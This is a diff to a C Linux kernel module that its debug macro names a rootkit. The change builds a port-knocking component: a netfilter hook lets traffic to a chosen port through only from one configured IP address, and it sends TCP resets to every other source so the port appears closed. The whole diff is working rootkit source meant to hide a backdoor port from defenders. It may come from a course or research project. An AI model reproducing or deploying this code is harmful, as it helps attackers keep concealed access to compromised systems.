@@ -1,12 +1,14 @@
-
 /*
  * This file provides all the functionality needed for port knocking.
  */
-#include <net/ip.h>
 #include <linux/inet.h>
 #include <linux/netfilter.h>
 #include <linux/netfilter_ipv4.h>
 #include <linux/skbuff.h>
+
+#include <net/icmp.h>
+#include <net/ip.h>
+#include <net/netfilter/ipv4/nf_reject.h>
 
 #include "include.h"
 #include "main.h"
@@ -18,8 +20,7 @@ static struct nf_hook_ops hook;
 static unsigned int port;
 
 /* the ip address which is allowed to connect */
-static u8 ip[4];
-
+static __u32 ip;
 
 /* 
  * This function does all the checking.
@@ -38,8 +39,19 @@ is_port_blocked (struct sk_buff *skb) {
 		tcp_header = (struct tcphdr *) skb_transport_header(skb);
 		
 		if(ntohs(tcp_header->dest) == port) {
-			ROOTKIT_DEBUG("Received packet on filtered tcp port %u.\n", port);
+			ROOTKIT_DEBUG("Received packet on filtered tcp port %u from IP %pI4.\n",
+				port, &ip_header->saddr);
 			
+			/* check if the ip matches */
+			if(ntohl(ip_header->saddr) == ip) {
+
+				return 0;	/* allow it */
+
+			} else {
+				
+				return 1;	/* reject it */
+
+			}
 			
 		}
 	}
@@ -48,13 +60,24 @@ is_port_blocked (struct sk_buff *skb) {
 		udp_header = (struct udphdr *) skb_transport_header(skb);
 		
 		if(ntohs(udp_header->dest) == port) {
-			ROOTKIT_DEBUG("Received packet on filtered udp port %u.\n", port);
+			ROOTKIT_DEBUG("Received packet on filtered udp port %u from IP %pI4.\n",
+				port, &ip_header->saddr);
 			
+			/* check if the ip matches */
+			if(ntohl(ip_header->saddr) == ip) {
+
+				return 0;	/* allow it */
+
+			} else {
+
+				return 1;	/* reject it */
+
+			}
 			
 		}
 	}
 
-	return 0;
+	return 0;	/* allow it */
 }
 
 /* 
@@ -70,14 +93,21 @@ knocking_hook (const struct nf_hook_ops *ops,
 	const struct net_device *out,
 	int (*okfn)(struct sk_buff *))
 {
-
+	struct iphdr *ip_header = (struct iphdr *) skb_network_header(skb);
+	
 	/* check if we need to block this packet */
 	if(is_port_blocked(skb)) {
 
 		/* 
 		 * craft an appropriate REJECT response
 		 */
-		// TODO: REJECT the message		
+		if(ip_header->protocol == 6) {	/* tcp */
+			nf_send_reset(skb, ops->hooknum);
+		}
+		
+		if(ip_header->protocol == 17) {	/* udp */
+			// TODO: implement correct udp behavior
+		}
 
 		/* we can now safely drop the packet */
 		ROOTKIT_DEBUG("Dropped a packet due to port knocking.\n");
@@ -97,11 +127,22 @@ int
 load_port_knocking (char *ipv4_addr, unsigned int port_number)
 {
 	int ret;
+	u8 tmp[4];
 	
 	ROOTKIT_DEBUG("Starting to load the port knocking...\n");
 	
 	/* convert ip string to an int array */
-	in4_pton(ipv4_addr, -1, ip, -1, NULL);
+	in4_pton(ipv4_addr, -1, tmp, -1, NULL);
+	ip = 0;
+
+	/* hack to convert byte array to __u32 */
+	ip |= tmp[0] & 0xFF;
+	ip <<= 8;
+	ip |= tmp[1] & 0xFF;
+	ip <<= 8;
+	ip |= tmp[2] & 0xFF;
+	ip <<= 8;
+	ip |= tmp[3] & 0xFF;
 
 	/* copy the port number */
 	port = port_number;
